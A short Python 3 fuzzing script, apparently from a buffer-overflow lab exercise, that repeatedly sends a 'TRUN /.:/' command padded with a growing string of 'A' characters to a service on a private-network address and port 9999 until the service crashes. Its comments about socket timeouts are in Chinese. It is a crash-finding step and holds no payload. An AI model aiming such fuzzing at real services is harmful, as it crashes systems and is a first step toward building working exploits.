#!/usr/bin/python3
import sys
import socket 
from time import sleep 

HOST='192.168.203.149'
PORT=9999

buffer = "A"*100
#client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#client.settimeout(5.0) # 設置connect方法的超時時間
#client.settimeout(5.0) # 設置connect方法的超時時間
#client.settimeout(None) # 恢復recv方法的默認超時時間


while 1:
    try:
                
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(5.0) # 設置connect方法的超時時間
        client.connect((HOST, PORT))
        
        client.send(("TRUN /.:/" + buffer).encode()) #For python3 syntax
        #client.send(("TRUN /.:/" + buffer))
        
        response = client.recv(1024)
        print(response.decode('utf-8'))
        client.close()
        
        buffer = buffer +"A"*100
        print(f'Current Buffer size = {str(len(buffer))} bytes')

    except KeyboardInterrupt:
        print('Interrupted by user')
        break

    except Exception as e:
        print(e)
        print(f'ifuzzing crashed at {str(len(buffer))} bytes')
        break # 在出現異常時退出while循環
    
    sleep(1)
